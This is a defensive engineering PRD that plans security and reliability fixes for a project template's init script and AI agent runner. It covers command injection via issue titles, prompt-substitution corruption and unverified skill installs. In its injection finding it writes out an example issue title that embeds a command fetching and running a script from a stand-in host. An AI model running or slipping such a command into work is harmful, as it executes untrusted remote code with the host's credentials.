# PRD — Template review fixes (deep review 2026-07-07)

## Background

A deep review of the template (init.mjs, sandcastle runners/doctors, CI templates, skills,
docs) surfaced ~20 findings. They cluster into four batches, ordered by how much each closes
the "init/runner reports success while lying" gap. This PRD covers all four; **Batch 1 is the
immediate AFK target**, batches 2–4 are follow-on.

## Goals

- No path where init or the AFK runner reports success while silently omitting or breaking
  what the template promises (skills, sandbox mode, security).
- Untrusted issue content (titles/bodies) cannot execute code on the host running the AFK loop.

## Batch 1 — security & silent-failure fixes (ship first)

### B1.1 Runner command injection via issue titles

`templates/ts/sandcastle-main.mts:139-143` and `templates/py/sandcastle-main.mts:136-140`
interpolate `issue.title` into a shell string: `gh pr create --title ${JSON.stringify(issue.title)}`
under `execSync`. `JSON.stringify` escapes quotes but not `$(…)` or backticks, which the shell
expands inside double quotes — an issue titled `` fix `curl evil.sh|sh` `` executes on the host
with the host's gh/git credentials. Fix: use `spawnSync` with an argument array (no shell) for
any command interpolating issue data. Audit both files for other interpolation points
(branch names are derived from `issue.number`, safe; title is the vector).

**Acceptance:** PR creation uses array-form spawn; a test-style grep proves no `execSync` call
interpolates `issue.title`/`issue.body`; both templates stay behaviorally identical otherwise.

### B1.2 Prompt substitution corruption

Same files (ts:103, py:105): `promptTemplate.replace("<<ISSUE_JSON>>", json)` treats `$&`,
`$'`, `` $` `` in the replacement as special patterns — an issue body containing them scrambles
the effective prompt. Fix: `.replace("<<ISSUE_JSON>>", () => json)`.

**Acceptance:** replacer-function form in both templates.

### B1.3 Reject `skillLocation: global` + Docker sandcastle

The Docker container only sees repo-committed files, so global skills are invisible to the
in-container agent — documented in init-project SKILL.md but unenforced. Fix: `loadAnswers()`
in `scripts/init.mjs` dies when `skillLocation !== "project"` and `sandcastle.enabled` with
`sandcastle.mode === "docker"`, with a message explaining the constraint.

**Acceptance:** the invalid combination exits non-zero with a clear message; valid combos
unaffected; SKILL.md interview notes the constraint is enforced.

### B1.4 Verify skill installs actually landed

`installSkills()` (`scripts/init.mjs:376-384`) runs `npx skills add … --copy -y` with
`allowFail: true`; if the registry is down, init continues and `selfCheck()` only asserts
`coding-standards` exists. A project can pass `--cleanup` and self-remove the template while
missing the entire workflow skill set. Fix: after installs (when `skillLocation === "project"`),
assert the expected skill dirs exist under `.claude/skills/` (grill-me, to-prd, handoff,
writing-plans, executing-plans, verification-before-completion); print a loud warning listing
missing ones at install time, and re-check in `selfCheck()` so `--cleanup` fails while the
template (and its retry path) still exists.

**Acceptance:** missing skills fail the cleanup self-check with the list of absent skills and
the retry command; all-present path unchanged.

### B1.5 Refuse `sandcastle.mode: "none"` until T3b validates it

Both `sandcastle-main.mts` templates hardcode `sandbox: docker()` and both doctors hard-require
the Docker daemon + image, so a `mode: "none"` project dies at pre-flight despite init wiring it
happily. Fix (cheapest honest option): `loadAnswers()` dies on
`sandcastle.enabled && sandcastle.mode !== "docker"` pointing at backlog T3b; wire the real
`noSandbox()` path later. Update SKILL.md interview + example config comment accordingly.

**Acceptance:** `mode: "no-sandbox"` answers exit non-zero with the T3b pointer; docker mode
unaffected; docs updated.

## Batch 2 — parameterize the hardcoded (follow-on)

- B2.1 `ORG` becomes an interview answer (`org` in ANSWER_FIELDS + example config + SKILL.md);
  license choice (proprietary / MIT / none) instead of proprietary-to-psmsun default.
- B2.2 `templateCommit` stamped at template release time (into CHANGELOG.md), read from there
  by `templateStamp()`; never falls back to the generated project's HEAD.
- B2.3 Audit steps (`pnpm audit`, `pip-audit`) move to a non-blocking job in both ci.yml
  templates so new advisories can't freeze autonomous merges.
- B2.4 Python package-dir detection filters `readdirSync(src)` to directories.
- B2.5 Drop `lint-staged` (installed twice, configured never) + delete the README claim.

## Batch 3 — hardening (follow-on)

- B3.1 Mixed-stack ci.yml built from structured data instead of jobs:-slice splicing; YAML
  parse check of templates + synthesized mixed workflow in validate-template.mjs.
- B3.2 Partial-state preamble in init.mjs (refuse when template.config.json or scaffold
  artifacts already exist).
- B3.3 template-ci syntax-checks the .mts runners and YAML-lints ci templates.

## Batch 4 — docs, hygiene, trust model (follow-on)

- B4.1 Doc-drift sweep (SKILL.md cleanup list; skills-manifest "confirm each"; README
  to-issues/lint-staged/global-no-op; runner "auto-merge" comment).
- B4.2 Add docs/superpowers/ to --cleanup removals.
- B4.3 Trust-model paragraph in both sandcastle prompts + coding-standards guidance
  (auto-merge ⇒ tests are the only gate; approve-builds --all is supply-chain surface).
- B4.4 Drop unused `gh repo *` / `gh label *` permissions from .claude/settings.json.
- B4.5 Refresh pins (ruff-pre-commit, mirrors-mypy; review setup-uv, SC_MODEL default).
- B4.6 Remove dead first vitest.config.ts write in scaffoldTsLibrary.
- B4.7 dev-browser boilerplate only for UI-facing stacks.

## Verification (all batches)

`node scripts/validate-template.mjs` green; template-ci green; for init.mjs changes, a
throwaway-answers dry run of `loadAnswers` guards.
